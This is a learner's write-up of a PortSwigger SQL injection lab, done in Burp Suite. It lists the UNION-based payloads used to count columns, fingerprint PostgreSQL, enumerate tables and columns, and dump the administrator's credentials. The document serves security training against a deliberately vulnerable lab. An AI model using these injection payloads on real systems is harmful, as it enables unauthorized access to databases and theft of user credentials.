## SQLi Lab #5 Writeup

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

### Lab: SQL injection UNION attack, retrieving data from other tables

I will be using Burp Suite for this lab. When I first load in to the lab, I am going to enable my Burp Suite proxy in Firefox using FoxyProxy. 

Once enabled, I can turn on the intercept in Burp Suite and try to load the "Gifts" section of the vulnerable website.

Once I have sent that request to the Repeater in Burp Suite, I can begin injecting some payloads.

1. First I am going to determine the number of columns with the following iterative payload process.

```SQL
' order by 1--
```
> 200
```SQL
' order by 2--
```
> 200
```SQL
' order by 3--
```
> 500 Internal Server Error

Because of the 500 error, I can deduce that the amount of columns is 3 - 1 = 2.

2. Next, I'll determine the data types of the columns.

Since both columns of data on the website are just text, I am going to first guess that both columns are a string with the following payload.
```SQL
' UNION select 'a', 'a'--
```
> 200

I received a 200 response, so I now know that both of the columns are strings.

3. Now that I know there are two columns that are strings, I can try and figure out the version of the database. I'll be using the following link as a cheat sheet.
https://portswigger.net/web-security/sql-injection/cheat-sheet


Microsoft Database Version Payload:
```SQL
' UNION SELECT @@version--
```
> 500 error

PostgreSQL Database Version Payload:
```SQL
' UNION SELECT version()--
```
> 500 error

Oracle Database Version Payload
```SQL
' UNION SELECT banner FROM v$version--
```
> 500 error

I must be doing something incorrect. Checking for syntax errors and workflow errors in community solutions.

I realised I was forgetting the columns in the payload. Since it was not querying the correct amount of columns, no matter what I did, I would get a 500 error.
```SQL
' UNION SELECT version(), NULL--
```
> 200

After looking into the 200 response, I can see that the version is the following:

```HTML
<th>
PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1) on
x86_64-pc-linux-gnu, compiled by gcc 
(Ubuntu 9.4.0-1ubuntu1~20041) 9.4.0, 64-bit
</th>
```

4. Now that I know the version and database is PostgreSQL, I can begin looking at the database contents in the cheatsheet.
I'll use the following to try and find the table names:
```SQL
SELECT * FROM information_schema.tables
```
However, instead of *, I'll need to find the correct name by googling something like "information_schema.tables postgreSQL"
I can see that in the following link, the table names are identified as 'table_name'.
https://www.postgresql.org/docs/current/infoschema-columns.html

Therefore my payload is:
```SQL
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
> 200

We received the 200 code. Looking at the results, it looks like one of following table names is 'user':
```HTML
<th>
users
</th>    
```

5. I'm going to try and look at the column names of the table name 'users'. From the cheat sheet, my payload will look something like the following:
```SQL
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
Instead of *, I can see from the postgreSQL website that the name of columns is column_name. This will be the next payload.
```SQL
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--
```
> 200

Two of the following columns are named password and username.

6. Now that I know the table and column names, I can see what is in those columns with the following simple payload.

```SQL
' UNION select username, password FROM users--
```
> 200
a
The above injection gave me administrator password and username.
```HTML
                           <th>administrator</th>
                            <td>787wo1nrar3t43x9pcko</td>
```


7. Now, I'll return to the website and login with that information. 

### Congratulations! I solved the lab :)




### Things to improve upon:
* Don't accidentally encode the payload twice. oof!

* Don't forget the whole point of columns in your payloads after finding the number of columns.

* The search function in Burp Suite is much easier than scrolling, don't forget to use it.

* VIM keybinds, get to know them.

* Take a look at Markdown syntax for better blog-writting!